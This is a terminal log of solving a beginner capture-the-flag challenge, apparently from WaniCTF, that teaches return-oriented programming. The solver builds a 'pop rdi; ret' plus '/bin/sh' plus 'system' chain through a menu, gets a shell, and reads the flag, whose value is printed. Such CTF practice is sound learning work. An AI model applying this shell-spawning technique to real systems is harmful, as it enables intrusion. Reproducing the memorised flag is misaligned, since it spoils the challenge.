```
# nc rop-easy.pwn.wanictf.org 9003

"/bin/sh" address is 0x404070

[menu]
1. append hex value
2. append "pop rdi; ret" addr
3. append "system" addr
8. show menu (this one)
9. show rop_arena
0. execute rop
> 2
"pop rdi; ret" is appended
> 1
hex value?: 0x404070
0x0000000000404070 is appended
> 3
"system" is appended
> 0
     rop_arena
+--------------------+
| pop rdi; ret       |<- rop start
+--------------------+
| 0x0000000000404070 |
+--------------------+
| system             |
+--------------------+
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{this-is-simple-return-oriented-programming}
```
